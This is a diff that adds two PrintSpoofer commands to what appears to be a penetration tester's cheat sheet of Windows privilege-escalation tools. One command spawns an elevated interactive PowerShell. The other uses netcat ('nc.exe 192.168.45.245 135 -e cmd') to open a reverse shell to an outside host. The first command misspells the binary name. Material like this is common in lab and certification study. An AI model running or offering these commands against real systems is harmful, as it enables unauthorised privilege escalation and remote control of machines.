@@ -155,6 +155,14 @@ https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/Enable
 
 ## Link: https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0
 
+Interactive shell on same session
+
+    .\PrintSoofer64.exe -i -c powershell
+
+Run reverse shell 
+
+    .\PrintSpoofer64.exe -c "C:\temp\nc.exe 192.168.45.245 135 -e cmd"
+
 ## Tool: Invoke-BadPotato
 
 ## Link: https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-BadPotato.ps1
